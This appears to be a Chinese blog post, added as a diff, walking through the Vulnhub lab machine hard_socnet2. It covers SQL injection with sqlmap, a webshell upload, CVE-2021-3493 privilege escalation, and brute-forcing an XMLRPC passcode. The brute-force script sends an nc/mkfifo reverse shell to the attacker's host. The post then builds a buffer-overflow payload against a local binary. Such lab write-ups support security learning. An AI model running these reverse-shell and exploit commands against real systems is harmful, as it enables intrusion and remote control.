@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Hard-Socnet2 | YiFang</title><meta name="keywords" content="Vulnhub-Hard"><meta name="author" content="YiFang"><meta name="copyright" content="YiFang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Vulnhub靶机打靶-hard-socnet2靶机详情难度：高 涉及知识：  主机发现  端口扫描  SQL注入  文件上传  蚁剑上线  CVE-2021-3493  XMLRPC  逆向工程  动态调试  缓冲区溢出  漏洞利用代码编写    靶机下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;hard_socnet2.ova 攻击方法有2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hard-Socnet2">
+<meta property="og:url" content="http://example.com/2022/01/17/hardsocnet2/index/index.html">
+<meta property="og:site_name" content="YiFang">
+<meta property="og:description" content="Vulnhub靶机打靶-hard-socnet2靶机详情难度：高 涉及知识：  主机发现  端口扫描  SQL注入  文件上传  蚁剑上线  CVE-2021-3493  XMLRPC  逆向工程  动态调试  缓冲区溢出  漏洞利用代码编写    靶机下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;hard_socnet2.ova 攻击方法有2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122112553.jpg">
+<meta property="article:published_time" content="2022-01-17T02:47:27.410Z">
+<meta property="article:modified_time" content="2022-01-12T13:12:45.492Z">
+<meta property="article:author" content="YiFang">
+<meta property="article:tag" content="Vulnhub-Hard">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122112553.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/17/hardsocnet2/index/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hard-Socnet2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-12 21:12:45'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201112100412.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122112553.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">YiFang</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Hard-Socnet2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-17T02:47:27.410Z" title="发表于 2022-01-17 10:47:27">2022-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-12T13:12:45.492Z" title="更新于 2022-01-12 21:12:45">2022-01-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Vulnhub/">Vulnhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Hard-Socnet2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Vulnhub靶机打靶-hard-socnet2"><a href="#Vulnhub靶机打靶-hard-socnet2" class="headerlink" title="Vulnhub靶机打靶-hard-socnet2"></a>Vulnhub靶机打靶-hard-socnet2</h1><h2 id="靶机详情"><a href="#靶机详情" class="headerlink" title="靶机详情"></a>靶机详情</h2><p>难度：高</p>
+<p>涉及知识：</p>
+<ul>
+<li><p>主机发现</p>
+</li>
+<li><p>端口扫描</p>
+</li>
+<li><p>SQL注入</p>
+</li>
+<li><p>文件上传</p>
+</li>
+<li><p>蚁剑上线</p>
+</li>
+<li><p>CVE-2021-3493</p>
+</li>
+<li><p>XMLRPC</p>
+</li>
+<li><p>逆向工程</p>
+</li>
+<li><p>动态调试</p>
+</li>
+<li><p>缓冲区溢出</p>
+</li>
+<li><p>漏洞利用代码编写</p>
+</li>
+</ul>
+<hr>
+<p>靶机下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova">https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</a></p>
+<p>攻击方法有2种，CVE-2021-3493[Ubuntu漏洞] 另类提权方式</p>
+<hr>
+<p>攻击主机：kali Linux 2021 192.168.0.103</p>
+<p>目标主机： Ubuntu 18</p>
+<h2 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -sC 192.168.0.102</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/nmap.png"></p>
+<p>目标主机打开了22，80，8000端口</p>
+<p>经过测试，80页面允许正常访问，8000端口不允许任何HTTP连接方式，猜测可能存在另类服务。</p>
+<p>访问80页面发现存在当前页面，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/80.png" alt="80"></p>
+<p>二话不说直接进行sqlmap跑一波<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071201750.png" alt="sql"></p>
+<p>前端存在SQL漏洞，获得admin账户进行登录，使用更改头像功能，上次一句话木马，<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071202189.png" alt="eval"></p>
+<p>蚁剑测试连接成功！<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071202528.png" alt="antsword"></p>
+<p>可以看到获得的权限为www-data权限，尝试进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html/data/images/profiles) $ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:    Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.1 LTS</span><br><span class="line">Release:    18.04</span><br><span class="line">Codename:    bionic</span><br></pre></td></tr></table></figure>
+
+<p>发现目标为Ubuntu 18.04 LTS版本</p>
+<p>尝试使用最新的EXP CVE-2021-9493（蚁剑的shell无法提权shell需要转nc shell）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071205198.png" alt="ncshell"></p>
+<p>上传exp文件运行，getshell，id查看自己的身份为root 打靶结束<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071202582.png" alt="cvegetshell"></p>
+<hr>
+<p>不会以为就这样就结束了吧！！！</p>
+<p>该靶机可是高难度的靶机！！！能如此轻松的解决这个靶机根本原因也是因为——该靶机为2020年的靶机，而刚才的打靶过程中，可是用到了2021年的CVE，也就是说我在用前朝的剑斩本朝的君！</p>
+<h2 id="正常操作"><a href="#正常操作" class="headerlink" title="正常操作"></a>正常操作</h2><p>回到www-data权限下，尝试正常的得到shell权限，首先发现/home/socnet/monitor.py文件，打开文件查看一波！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到使用了xmlRPC库，百度大法，找到一个xmlRPC的一个客户端，然后大致的修改一下，对secure_cmd函数进行爆破，尝试提权为socnet用户权限</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    word = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.0.102:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">        res = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.103 6666 &gt;/tmp/f&#x27;</span>,word))</span><br></pre></td></tr></table></figure>
+
+<p>可能要多等一会</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071210565.png" alt="xmlrpc"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>python 获得pty 对ncshell进行升级</p>
+<p>发现存在一个add_record文件</p>
+<p>在目标主机上，使用gdb进行动态调试，发现在Explain参数里面存在内存溢出<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071209670.png" alt="gdb"></p>
+<p>重点关注EIP寄存器被溢出了大量的’1111’</p>
+<p>精确找到’1111’的具体位置（使用二分法判断）<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071207910.png" alt="eip"></p>
+<p>得出偏移量为62</p>
+<p>对汇编代码进行分析，发现存在vuln函数和backdoor函数，尝试溢出backdoor的起始内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import struct; print(&#x27;a\n1\n1\n1\n1&#x27;+ &#x27;A&#x27;*61 +struct.pack(&#x27;I&#x27;,0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure>
+
+<p>生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071208625.png" alt="getshell"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">YiFang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/17/hardsocnet2/index/">http://example.com/2022/01/17/hardsocnet2/index/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">YiFang</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub-Hard/">Vulnhub-Hard</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122112553.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/17/Mercury/index/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122108657.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Mercury</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/17/hacksudo/index/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122110913.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HackSudo</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/17/fawkes/index/" title="Fawkes"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161016302.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">Fawkes</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnhub%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6-hard-socnet2"><span class="toc-number">1.</span> <span class="toc-text">Vulnhub靶机打靶-hard-socnet2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E8%AF%A6%E6%83%85"><span class="toc-number">1.1.</span> <span class="toc-text">靶机详情</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%BC%80%E5%A7%8B"><span class="toc-number">1.2.</span> <span class="toc-text">攻击开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.</span> <span class="toc-text">正常操作</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By YiFang</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2022/01/17/hardsocnet2/index/'
+    this.page.identifier = '2022/01/17/hardsocnet2/index/'
+    this.page.title = 'Hard-Socnet2'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
